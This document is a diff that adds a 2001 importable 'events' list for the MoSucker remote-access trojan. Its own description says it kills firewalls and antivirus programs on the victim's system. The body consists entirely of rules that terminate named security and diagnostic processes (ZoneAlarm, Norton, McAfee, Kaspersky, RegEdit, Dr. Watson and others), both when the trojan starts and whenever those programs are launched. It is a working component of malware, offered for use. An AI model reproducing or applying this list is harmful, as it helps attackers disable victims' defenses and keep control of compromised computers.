@@ -1,0 +1,126 @@
+
+//*****************************************************
+//Importable events list for MoSucker 2.2 or higher
+//*****************************************************
+
+//----------- Description -----------------------------
+//This list will kill (terminate) all well-known
+//firewalls and Anti-Virus programs currently running
+//on the victim's system. It will NOT delete or currupt
+//these programs, it will just stop them.
+
+//----------- How to use ------------------------------
+//To import this list, create a new server or choose
+//"edit existing server", select the tab "events" and
+//click the "import" button.
+
+//----------- Last updated ----------------------------
+//Last updated: June 30th, 2001 by hypnosis
+
+//----------- Kills -----------------------------------
+//ZoneAlarm (Including Pro), LockDown, Norton AntiVirus,
+//Trojan Check, Trojan First Aid Kit, MS Visual Studio
+//Spy tools, Dr. Watson, RegEdit, The Cleaner, Trojan
+//Defense Suit 3, Anti Trojan, Dr. Solomon, Norton
+//Utilities, McAffee Virus scan, Kaspersky Anti Virus
+//RegRun II, Tau Monitor, ANTS and AtGuard
+
+
+
+//Terminate programs when the server starts up
+//
+OnServerStart: Terminate running task ZAUINST.EXE
+OnServerStart: Terminate running task ZAPRO.EXE
+OnServerStart: Terminate running task ZONEALARM.EXE
+OnServerStart: Terminate running task ZATUTOR.EXE
+OnServerStart: Terminate running task MINILOG.EXE
+OnServerStart: Terminate running task VSMON.EXE
+OnServerStart: Terminate running task LOCKDOWN.EXE
+OnServerStart: Terminate running task NAVAPW32.EXE
+OnServerStart: Terminate running task ANTS.EXE
+OnServerStart: Terminate running task FAST.EXE
+OnServerStart: Terminate running task GUARD.EXE
+OnServerStart: Terminate running task UPDATE.EXE
+OnServerStart: Terminate running task AUTOUPDATE.EXE
+OnServerStart: Terminate running task TC.EXE
+OnServerStart: Terminate running task SPYXX.EXE
+OnServerStart: Terminate running task PVIEW95.EXE
+OnServerStart: Terminate running task REGEDIT.EXE
+OnServerStart: Terminate running task DRWATSON.EXE
+OnServerStart: Terminate running task NSCHED32.EXE
+OnServerStart: Terminate running task CLEANER.EXE
+OnServerStart: Terminate running task MOOLIVE.EXE
+OnServerStart: Terminate running task TCA.EXE
+OnServerStart: Terminate running task TCM.EXE
+OnServerStart: Terminate running task TDS-3.EXE
+OnServerStart: Terminate running task SS3EDIT.EXE
+OnServerStart: Terminate running task UPDATE.EXE
+OnServerStart: Terminate running task ANTI-TROJAN.EXE
+OnServerStart: Terminate running task ATCON.EXE
+OnServerStart: Terminate running task ATUPDATER.EXE
+OnServerStart: Terminate running task ATWATCH.EXE
+OnServerStart: Terminate running task WGFE95.EXE
+OnServerStart: Terminate running task POPROXY.EXE
+OnServerStart: Terminate running task NPROTECT.EXE
+OnServerStart: Terminate running task VSSTAT.EXE
+OnServerStart: Terminate running task VSHWIN32.EXE
+OnServerStart: Terminate running task NDD32.EXE
+OnServerStart: Terminate running task MCAGENT.EXE
+OnServerStart: Terminate running task MCUPDATE.EXE
+OnServerStart: Terminate running task AVPCC.EXE
+OnServerStart: Terminate running task AVPM.EXE
+OnServerStart: Terminate running task WATCHDOG.EXE
+OnServerStart: Terminate running task TAUMON.EXE
+OnServerStart: Terminate running task IAMAPP.EXE
+OnServerStart: Terminate running task IAMSERV.EXE
+
+
+//Terminate programs if they are started while the server is running
+//
+OnTaskRunning ZAUINST.EXE: Terminate running task ZAUINST.EXE
+OnTaskRunning ZAPRO.EXE: Terminate running task ZAPRO.EXE
+OnTaskRunning ZONEALARM.EXE: Terminate running task ZONEALARM.EXE
+OnTaskRunning ZATUTOR.EXE: Terminate running task ZATUTOR.EXE
+OnTaskRunning MINILOG.EXE: Terminate running task MINILOG.EXE
+OnTaskRunning VSMON.EXE: Terminate running task VSMON.EXE
+OnTaskRunning LOCKDOWN.EXE: Terminate running task LOCKDOWN.EXE
+OnTaskRunning NAVAPW32.EXE: Terminate running task NAVAPW32.EXE
+OnTaskRunning ANTS.EXE: Terminate running task ANTS.EXE
+OnTaskRunning FAST.EXE: Terminate running task FAST.EXE
+OnTaskRunning GUARD.EXE: Terminate running task GUARD.EXE
+OnTaskRunning UPDATE.EXE: Terminate running task UPDATE.EXE
+OnTaskRunning AUTOUPDATE.EXE: Terminate running task AUTOUPDATE.EXE
+OnTaskRunning TC.EXE: Terminate running task TC.EXE
+OnTaskRunning TFAK.EXE: Terminate running task TFAK.EXE
+OnTaskRunning SPYXX.EXE: Terminate running task SPYXX.EXE
+OnTaskRunning PVIEW95.EXE: Terminate running task PVIEW95.EXE
+OnTaskRunning REGEDIT.EXE: Terminate running task REGEDIT.EXE
+OnTaskRunning DRWATSON.EXE: Terminate running task DRWATSON.EXE
+OnTaskRunning NSCHED32.EXE: Terminate running task NSCHED32.EXE
+OnTaskRunning CLEANER.EXE: Terminate running task CLEANER.EXE
+OnTaskRunning MOOLIVE.EXE: Terminate running task MOOLIVE.EXE
+OnTaskRunning TCA.EXE: Terminate running task TCA.EXE
+OnTaskRunning TCM.EXE: Terminate running task TCM.EXE
+OnTaskRunning TDS-3.EXE: Terminate running task TDS-3.EXE
+OnTaskRunning SS3EDIT.EXE: Terminate running task SS3EDIT.EXE
+OnTaskRunning UPDATE.EXE: Terminate running task UPDATE.EXE
+OnTaskRunning ANTI-TROJAN.EXE: Terminate running task ANTI-TROJAN.EXE
+OnTaskRunning ATCON.EXE: Terminate running task ATCON.EXE
+OnTaskRunning ATUPDATER.EXE: Terminate running task ATUPDATER.EXE
+OnTaskRunning ATWATCH.EXE: Terminate running task ATWATCH.EXE
+OnTaskRunning WGFE95.EXE: Terminate running task WGFE95.EXE
+OnTaskRunning POPROXY.EXE: Terminate running task POPROXY.EXE
+OnTaskRunning NPROTECT.EXE: Terminate running task NPROTECT.EXE
+OnTaskRunning NDD32.EXE: Terminate running task NDD32.EXE
+OnTaskRunning VSSTAT.EXE: Terminate running task VSSTAT.EXE
+OnTaskRunning VSHWIN32.EXE: Terminate running task VSHWIN32.EXE
+OnTaskRunning MCAGENT.EXE: Terminate running task MCAGENT.EXE
+OnTaskRunning MCUPDATE.EXE: Terminate running task MCUPDATE.EXE
+OnTaskRunning AVPCC.EXE: Terminate running task AVPCC.EXE
+OnTaskRunning AVPM.EXE: Terminate running task AVPM.EXE
+OnTaskRunning WATCHDOG.EXE: Terminate running task WATCHDOG.EXE
+OnTaskRunning TAUMON.EXE: Terminate running task TAUMON.EXE
+OnTaskRunning IAMAPP.EXE: Terminate running task IAMAPP.EXE
+OnTaskRunning IAMSERV.EXE: Terminate running task IAMSERV.EXE
+
+//END of KILLAV list
